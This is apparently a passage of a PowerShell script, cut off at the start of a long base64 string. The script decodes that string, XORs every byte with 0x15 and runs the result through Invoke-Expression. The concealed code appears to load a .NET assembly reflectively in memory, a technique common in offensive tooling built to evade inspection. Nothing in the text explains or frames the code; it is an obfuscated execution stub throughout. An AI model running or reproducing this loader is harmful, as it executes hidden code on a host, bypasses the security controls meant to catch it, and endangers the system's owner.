VHZUV2ZUUkBUcVRXeVRSRFRcVFd9VFJiVHdUVHJUXVRUTERXb1RdWFRxYldjVF1cVE9UVHJUXVhU
dlRXbFRSUFRwRFdlVFIhVE9iVHJUUi1UdlRXeVRdXFRMRFclVFJ+VHdiV2BUXVhUWXJUVFFDdlR0
RFdgVF1EVE9EV2xUVFRbQGJXYlRdXFR0RFdgVFJ2VFRUJEFUXUBUd0RXYVRSQFR2clRUUUBQVHFE
VyVUXUBUd0RXYFRUVFNwRFcgVFRUUVxEVFRWTX5UcERXIFRdflRUVFhtVFRUUVhyVFRUb1hUVFRA
bVRWUFRUVEBsVFZQVFRUQG9UVlBUVFR2bVRRXFRYYlRUVkFQVFhyVG9UUURUVFR+bVRRXFRYYlR9
VFRUWVhEVGxUUVhUW1RUfVRUVlR7Q2ZUWURXcVRWVFRDVFd6VFJAVFxUV0FUUkBUT0RXflRQYlR0
RFdvVF1EVFxUVydUUlBUdnJXZVRSUFRMcldmVFJAVFxUV2VUXVhUXFRXeVRSJVR2VFclVF1+VFpi
VHJUXURUdFRXeVRWVFRHYld5VF1EVEBiV3lUUlBUdmJXY1RSIVReVFRlVFZUVE9yVyRUUiFUTGJX
JVRSflR3YldgVFZUVHFiV2VUUmJUd1RUclRdXFRPRFclVF1AVHZyV2BUVlRUd3JXJFRSYlR3VFRg
VFRQVFRWfFllJD5xeW9TRWV/XkJkfXR8Jl12VFdWVFdURHJRXFRUV1dGVFdUR1BHV1ZUV1REIVBc
VFBXVH9yXVJiIUNQfkBXUXJyXFFyIVxWV0BGR0RQWlZXX19QfiVcVldARkdEUFpQQ1BHQEdTR1NH
U0NURCFaU0dTQ1REIVpUfV9PVldTcVFERFRURCFaV0ZUV1F9JVFXVFRXVEQhU1NHX1NURCFTVFRc
VlFyIVBUVFBcUXJEVFRXXyBXVlRUUHslUVxUVFpXRFRWUXIhWldGVFdUR19fV0ZUVFB6VlNXVlRX
VlQhUlxUUFdQTFZfV1ZUVFB+JVJcVFBGclwlXFdGVFRQelZHV3xUV1B6VkNRckRyVEdiXFdGVFdU
R1hUVGxUVFZUTFRUYiF2XVdiU1xUVEZyX35SXFRQRnJfJVpUbFRUXVRMclRHJVpdRFhEUFRQV1NH
X1NURyFUU0deVGVEUHBUVFheVEQhUFRUVEdARExyVGJQXFZUclNcVFBHQERyUFxUUFpRfVBEVERQ
Q1B6VnlURyFUU0deVGVEUHBUV3JEVERcQ1B6VnlURyFUU0deVGVEUHBUV0BGcl5AV11yVFxcVFRD
UENAV1BiVFNTR1NDVEQhUFxUVEFUVHZyVHJQR3JeflpWVlRRVHIhWlBMVmFXYlRQUXIhWlFyIVBU
VFBXVlRYclRUXFNUVFBHTUQlUVxUVFtXclRRUXIhWlFyIV1XfVNHUENQR0BHU0dQQ1BHQER2VFRy
XEdAR1NHUmJ2XFNHX1NURCFDUH5AV1F9U0dTR1NDVEQhWlNHU0NURCFaUXJ8JnB5bUJSQUFyfER8
YkUkLDpQcUBeWnJAVFREUHFRckBUVEQhR0BEJVRUfUBGR0RQWlNHX1NURCFcVlRQVFZUVFRUVFRU
XXJQVFREV0BUfU9NdnhTYkF4LGBHTX1/T01XJXRCLGBDUn1sdyZxb1REcldUVFxUVFRUVFRULVdU
VGVBdFJTbHZTW2J2eFMgVFRUU1REVFRUVFRNVERURkQnLGJwTV9lTyd9JVxYXmVcVlRsWFFQIFRU
VGVURFR+W0FTf1t4QGJYQUxhWEFEbFpWJSVbUVN+WUFybE9BfmFMeFxiT0JcJFpBeXxMeFghVFRU
WFREVF1YRiFiWX9UYFhUVFRBRFBUXVYgWkdDR1J2eFNhT01xY3Z4ZmZDeENsdid5Y3d/JCdbViEn
WX9QV1RTRFpTUE9sTEIkeXEnLGx0JUdldiZXZkxNeVpMQiR5U1YgWkdDRHJHe199d0JDJncmX2dc
UURgW3whbVRUVFRUXEQ6f3FyVFRUVFRUclRUVF1mVFRUVnpERFRUZFZYVFRUVFRUVFRUVFRUVFRU
VFRUV1RUVFRUVFRUVFRUVFRUVFRUVFRUV0ZAJUdBLFlXUFsjPlY6JV52ICUlXkdNViNmYlBUVFRX
UVp5bUN2J0NsdiRtfU9SJGV3eW1QdyZxYHdSLH1PXVt2QCd9fXZ7V0F2XV99cEYkYUxNWyVPTV92
QCd9fXZ7V0F2XV99cEYkYUxNWyVPTV92QCd9fXZ7V0F2XV99cENtY0x4ZXZAeENmT0JTb09DbUF0
UlNsdlNbYnZ4UyBZe1d+THJXWURyVFRUVFRUVFRUVFRUV3lEclRUVFZUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRDJVxUVFRUVFRUVFRUVFRUVFRXc0QnLGxHTX15QUJTZXdyV2F2J1tjdnhD
eVl4R2Z3VFRUVFRUVFRFLXlUVldUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFxUUFRUVFRWVFRU
XFRMVFRUVEBUVFRyVFRUVFRUVFRUVFRUVFRUVFRUVFREVFdUVFRUWlRUVHJUVFRUVFRUVFRUVFRU
VFRUVFRUVERUVFRUVFRyVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRURFRXVFRUVHRUVFRyVFRUVFRU
VFRUVFRUVFRUVFRUVFREVFRUVFRUY1RYVFRfV3JUVFRmVGJUVFRUVFRUVFRUVFRUZlRvRFRUVFdC
VFNYVE1iV0JUUEBUQHJXQVRQflRBYldaVFMtVEZEV1pUUExUQWJUVFRUVFRjREFjOnJUVFREVFRU
VFBUVFRUVFRUVFRURFRUVFRUVEViVFRUVFRUVFRUUFRUVFRURFRUVFRUVFRUVFRUVFRUVFRUVFRQ
RFRUVFRXVFNMVExEV2xUUExUdERXZlRSQFRGRFdgVFJMVHdiVFRUVFRUX1RUUFRUVFRDVFdsVFJQ
VHdyV29UUmJUTERXJVRSflR3YldgVFRUVFRUVFRUWVRQf1RcVFRUUFRAYlclVF1cVHREV2BUUnZU
R3JXZVRSYlRPRFdfVFIhVE9yV2NUVFRUdFRcVFRUUFRYVFRiVFFUVFhUVGJUUURUTHJUYlRUVFRS
clRXVFRQVERiV2NUUiVUd0RXeVRSIVRxVFdvVFRUVFRUVFRUVlxUVERUV1RQWFR3YldhVF1UVExE
V2BUXX5UQXJXfVRSJVRPRFRUVFRUVFRUVFRUUSFUVmJUV1RQTFR0RFdmVFJAVEdUV3lUXVhUTGJX
bFRSflR2VFclVFJ+VHdiV2BUVFRUVFRXQVRSclRMRFdsVF1UVEBiV2JUXVxUTERXIFRUVFRUVFRi
VFRyVFREV1JUUn5Ud1RXeVRTTFRPRFdsVF1YVHREV2NUUiFUVFRUVFRRUFRZclRiVFYhVFhUVGBU
UVRUVFRUPlRULVRURFdfVFIhVHFUV3lUXVxUd3JXfVRSYlRBcld9VFIlVE9EVFRUU1hUdFRXfVRd
XFR2VFdBVF1UVHZyV31UXX5UWXJXeVRdclRPRFRUVFRUVEZUVEZUVFBUQVRXeVRSdlRMRFdmVFBY
VHdiV2JUXX5UdnJXZVRSdlR0VFclVFRUVERiV2NUXVRUcERXbFRSflRPYld6VF1EVFxUVmVUVlRU
XFRUbFRRVFRYRFQgVFRUVF5yVFdUVFBUQVRXeVRSdlRMRFdmVFNEVHZyV31UUkRUT0RXYVRSUFR2
cldnVF1YVFRUVFRUVFRUVFRXUlRULVRURFdFVF1cVHREV3tUUn5Ud3JXfVRSYlRHcldlVFJiVE9E
V2BUUlBUd0RXeVRUVFRAYld6VFJQVHZyV2JUU1hUdlRXbFRSUFRwRFRgVFJAVHBUV3lUVFRUVFRU
J1RUZlRURFdEVF1cVHdiV35UXUBUTGJXJVRQIVRMRFdhVFJAVFRUVFRUU1hUdFRXfVRdXFR2VFdB
VF1UVHZyV31UXX5UVFRUVFRRRFRWVFRXVFNUVHZyV2NUUkRUcURXf1RdRFRDcld5VF1cVHZiV2VU
Ui1Ud3JUVFRRUFRZclRiVFYhVFhUVGBUUVRUVFRUIVRUclRURFdXVF1YVHZiV3lUUiVUTHJXZlRd
flRcVFdCVFJAVHZyV29UUn5Ud2JXYFRUVFRYRFRgVFFUVFlyVGJUViFUWFRUVFRYbX9UVFFkVERU
VFRUVFRUVFRUVFRRY2AiLS1FJn1hd1ZXJ09NX290QixgRUZcbVl/VHxcUkNgTCcsfnRCIHtFRl9D
Q1BMYVpWXHJ2Jkd9d3hHfXdSLGBPQSV8cEJDb1x/LT5RRHpbVn9tfXYmW3l3Ql9mcEZXIXdCbWB2
byV8cU1fYFp7W390UkNhTE1YYXdCeX92eCxvdydPJVlCW2N3QWV9diclYHF/UHxcUiR9d3h5eE9N
WyVDeENsdid5Y3d/JXxYRiFiXH8hW1Z8VHJFUlNvdidDYUx4bSBGQkd5d3tHZXFdfnJxeENsdid5
Y3d/JXxYRiFiWX9UYFhWXHJ3eFNhT0ElfEFNeVd2XVdmdEJbfXFSeWN3fCB9dl1UfFlvIVtWfFRy
RV1HbHFNWyVGQiB4d2xXIXdCbWB2byV8cU1fYFp7W390UkNhTE1YYXdCeX92eCxvdydPJVlCW2N3
QWV9diclYHF/XHxFciVeXFZUclxRbW9PQlskdnh5JXBBIVtWfFRyXFZUclxRbWxPTVMkT01bJU9C
R0R2eHkndEJteU8nQ29cXX1hd1Igb0VGXyR2eCEjdidbek9CJH12bCRhdEJbbHcmW2NPe0RhTCcs
YVp4U293RiAnWGxcPlFEenJcVlRyXFZUclxRbWxPTVMkT01bJU9CR1NwUkN/cU1HZXcnIFhPTU95
d1ZXZk9NT3l3USV8TE1bX3d7T2N0J0NsXHxXJHRAU39MJ0Nvdm8lfE94U2Z2J0B8WW8hW1Z8VHJc
VlRyXFFiY3Z4Q21xQkNvcVJDfkBdX2VxeHlmT0JxeXZvIVtWfFRyXFZULVkmW3lMJkNsdE1HIEVy
JV5cVlQtWSZHbHFNWyVGQiB4d28hW1Z/YmNMTVtvT0IkfHddfj5UVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRURFRUVFFUVFRUXXJsVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVCgoNxgfNTU1NTFHVEY1KDVORmxmYXB4O0dwc3lwdmF8ens7
VGZmcHh3eWxILy9ZenRxPU5WentjcGdhSC8vU2d6eFd0ZnAjIUZhZ3x7cj0xd3RmcCMhd3x7dGds
PDwYHxgfNTU1NTFaeXFWentmenlwWmBhNSg1TlZ6e2Z6eXBILy9aYGEYHzU1NTUxRmFnfHtyQmd8
YXBnNSg1W3BiOFp3f3B2YTVcWjtGYWd8e3JCZ3xhcGcYHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0x
RmFnfHtyQmd8YXBnPBgfGB81NTU1TkZ9dGdlRmVndGw7Rn10Z2VGZWd0bEgvL1h0fHs9MVZ6eHh0
e3E7RmV5fGE9NzU3PDwYHxgfNTU1NU5WentmenlwSC8vRnBhWmBhPTFaeXFWentmenlwWmBhPBgf
NTU1NTFHcGZgeWFmNSg1MUZhZ3x7ckJnfGFwZztBekZhZ3x7cj08GB81NTU1MUdwZmB5YWYYH2gY
Hw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

